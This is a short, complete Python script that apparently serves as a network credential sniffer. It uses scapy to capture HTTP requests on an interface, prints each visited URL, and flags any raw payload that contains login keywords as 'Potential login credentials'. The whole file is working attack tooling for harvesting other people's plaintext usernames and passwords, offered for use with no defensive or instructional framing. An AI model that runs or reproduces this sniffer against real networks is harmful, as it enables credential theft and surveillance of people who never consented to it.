#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


class Tcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def extract_url(packet):
    host = packet["HTTPRequest"].Host
    path = packet["HTTPRequest"].Path
    return host + path


def check_for_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet['Raw'].load)
        keywords = ['usr', 'usrname', 'uname', 'user', 'username', 'login', 'pass', 'password', 'pwd', 'email']
        for keyword in keywords:
            if keyword in load:
                return load
        return False


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = extract_url(packet)
        print(url)
        credentials = check_for_login(packet)
        if credentials:
            print(Tcolors.WARNING + "Potential login credentials: " + Tcolors.FAIL + credentials + Tcolors.ENDC)


sniff("eth0")